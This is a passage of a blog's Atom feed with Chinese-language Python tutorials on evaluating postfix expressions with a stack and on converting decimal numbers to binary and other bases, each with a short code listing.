src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.9.%E4%B8%AD%E7%BC%80%E5%89%8D%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/assets/3.9.%E4%B8%AD%E7%BC%80%E5%90%8E%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F.figure11.png" alt="image"></p><p><em>Figure 11</em></p><p>假设后缀表达式是一个由空格分隔的标记字符串。 运算符为<code>*，/，+</code>和 <code>-</code> ，操作数假定为单个整数值。 输出将是一个整数结果。</p><ol><li>创建一个名为 <code>operandStack</code> 的空栈。</li><li>拆分字符串转换为标记列表。</li><li>从左到右扫描标记列表。<ul><li>如果标记是操作数，将其从字符串转换为整数，并将值压到operandStack。</li><li>如果标记是运算符<code>*，/，+</code>或<code>-</code>，它将需要两个操作数。弹出operandStack 两次。 第一个弹出的是第二个操作数，第二个弹出的是第一个操作数。执行算术运算后，将结果压到操作数栈中。</li></ul></li><li>当输入的表达式被完全处理后，结果就在栈上，弹出 operandStack 并返回值。</li></ol><p>用于计算后缀表达式的完整函数见 ActiveCode 2，为了辅助计算，定义了一个函数 doMath, 它将获取两个操作数和运算符，执行相应的计算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">+</div><div class="line"></div><div class="line"><span class="keyword">from</span> pythonds.basic.stack <span class="keyword">import</span> Stack</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">postfixEval</span><span class="params">(postfixExpr)</span>:</span></div><div class="line">    operandStack = Stack()</div><div class="line">    tokenList = postfixExpr.split()</div><div class="line"></div><div class="line">    <span class="keyword">for</span> token <span class="keyword">in</span> tokenList:</div><div class="line">        <span class="keyword">if</span> token <span class="keyword">in</span> <span class="string">"0123456789"</span>:</div><div class="line">            operandStack.push(int(token))</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            operand2 = operandStack.pop()</div><div class="line">            operand1 = operandStack.pop()</div><div class="line">            result = doMath(token,operand1,operand2)</div><div class="line">            operandStack.push(result)</div><div class="line">    <span class="keyword">return</span> operandStack.pop()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">doMath</span><span class="params">(op, op1, op2)</span>:</span></div><div class="line">    <span class="keyword">if</span> op == <span class="string">"*"</span>:</div><div class="line">        <span class="keyword">return</span> op1 * op2</div><div class="line">    <span class="keyword">elif</span> op == <span class="string">"/"</span>:</div><div class="line">        <span class="keyword">return</span> op1 / op2</div><div class="line">    <span class="keyword">elif</span> op == <span class="string">"+"</span>:</div><div class="line">        <span class="keyword">return</span> op1 + op2</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> op1 - op2</div><div class="line"></div><div class="line">print(postfixEval(<span class="string">'7 8 + 3 2 + /'</span>))</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;当你编写一个算术表达式如 &lt;code&gt;B*C&lt;/code&gt; 时，表达式的形式使你能够正确理解它。在这种情况下，你知道 B 乘以 C, 因为乘法运算符 &lt;code&gt;*&lt;/code&gt; 出现在表达式中。这种类型的符号称为中缀，因为运算符在它处理的两个操作数之间。看另外一个中缀示例，&lt;code&gt;A+B*C&lt;/code&gt;，运算符 &lt;code&gt;+&lt;/code&gt; 和 &lt;code&gt;*&lt;/code&gt; 仍然出现在操作数之间。这里面有个问题是，他们分别作用于哪个运算数上，&lt;code&gt;+&lt;/code&gt; 作用于 A 和 B , 还是 &lt;code&gt;*&lt;/code&gt; 作用于 B 和 C？表达式似乎有点模糊。
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>十进制转换成二进制</title>
    <link href="http://adamzeng.site/2017/10/27/%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    <id>http://adamzeng.site/2017/10/27/十进制转换成二进制/</id>
    <published>2017-10-27T09:13:05.000Z</published>
    <updated>2017-10-28T00:25:10.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-十进制转换成二进制"><a href="#1-十进制转换成二进制" class="headerlink" title="1.十进制转换成二进制"></a>1.十进制转换成二进制</h4><p>二进制在计算机科学中是很重要的，因为存储在计算机内的所有值都是以0和1存储的。如果没有能力在二进制数和普通字符串之间转换，我们与计算机之间的交互非常棘手。<a id="more"></a></p><p>整数值是常见的数据项。他们一直用于计算机程序和计算。我们在数学课上学习它们，当然最后用十进制或者基数10来表示它们。十进制233^10以及对应的二进制表示11101001^2分别解释为</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.8.%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6/assets/3.8.%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6.2.png" alt="image"></p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.8.%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6/assets/3.8.%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6.1.png" alt="image"></p><p>但是我们如何能够容易地将整数值转换为二进制呢？答案是“除2“算法，它用栈来跟踪二进制结果的数字。</p><p>”除2“算法嘉定我们从大于0的整数开始。不断迭代的将十进制除以2，并跟踪余数。第一个除以2的余数说明了这个值是偶数还是基数。偶数有0的余数，记为0，基数有余数1，记为1.我们将得到的而精致构建为数字序列，第一个余数实际上是序列中的最后一个数字。见Figure 5，我们再次看到了反转的属性，表示栈可能是解决这个问题的数据结构。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.8.%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6/assets/3.8.%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6.figure5.png" alt="image"></p><p><em>Figure 5</em></p><p>Activecode 1 中的 Python 代码实现了 “除 2” 算法，函数 divideBy2 传入了一个十进制的参数，并重复除以 2。第 7 行使用内置的模运算符 % 来提取余数，第 8 行将余数压到栈上。当除到 0 后，11-13 行构造了一个二进制字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pythonds.basic.stack <span class="keyword">import</span> Stack</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">divideBy2</span><span class="params">(decNumber)</span>:</span></div><div class="line">    remstack=Stack()</div><div class="line"></div><div class="line">    <span class="keyword">while</span> decNumber&gt;<span class="number">0</span>:</div><div class="line">        rem=decNumber%<span class="number">2</span></div><div class="line">        remstack.push(rem)</div><div class="line">        decNumber=decNumber//<span class="number">2</span></div><div class="line">        </div><div class="line">    binString=<span class="string">""</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">not</span> remstack.isEmpty():</div><div class="line">        binString=binString+str(remstack.pop())</div><div class="line">        </div><div class="line">    <span class="keyword">return</span> binString</div><div class="line">print(divideBy2(<span class="number">42</span>))</div><div class="line"></div><div class="line"><span class="number">101010</span></div></pre></td></tr></table></figure><p><em>ActiveCode 1</em></p><p>这个用于二进制转换的算法可以很容易的扩展以执行任何基数的转换。在计算机科学中，通常会使用很多不同的编码。其中最常见的是二进制，八进制和十六进制。</p><p>十进制233和它对应的八进制和十六进制351^8,E9^16</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.8.%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6/assets/3.8.%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6.3.png" alt="image"></p><p>可以修改divideBy2函数，使它不仅能接受十进制参数，还能接受与其转换的基数。’除2‘的概念被简单的替换成更通用的’除基数‘。在ActiveCode2展示的是一个名为baseConverter函数。采用十进制数和2到16之间的任何技术作为参数。余数部分仍然入栈，直到被转换的值为0。我们创建一组数字，用来表示超过9的余数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pythonds.basic.stack <span class="keyword">import</span> Stack</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">baseConverter</span><span class="params">(decNumber,base)</span>:</span></div><div class="line">    digits = <span class="string">"0123456789ABCDEF"</span></div><div class="line"></div><div class="line">    remstack = Stack()</div><div class="line"></div><div class="line">    <span class="keyword">while</span> decNumber &gt; <span class="number">0</span>:</div><div class="line">        rem = decNumber % base</div><div class="line">        remstack.push(rem)</div><div class="line">        decNumber = decNumber // base</div><div class="line"></div><div class="line">    newString = <span class="string">""</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">not</span> remstack.isEmpty():</div><div class="line">        newString = newString + digits[remstack.pop()]</div><div class="line"></div><div class="line">    <span class="keyword">return</span> newString</div><div class="line"></div><div class="line">print(baseConverter(<span class="number">25</span>,<span class="number">2</span>))</div><div class="line">print(baseConverter(<span class="number">25</span>,<span class="number">16</span>))</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;1-十进制转换成二进制&quot;&gt;&lt;a href=&quot;#1-十进制转换成二进制&quot; class=&quot;headerlink&quot; title=&quot;1.十进制转换成二进制&quot;&gt;&lt;/a&gt;1.十进制转换成二进制&lt;/h4&gt;&lt;p&gt;二进制在计算机科学中是很重要的，因为存储在计算机内的所有值都是以0和1存储的。如果没有能力在二进制数和普通字符串之间转换，我们与计算机之间的交互非常棘手。
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
</feed>
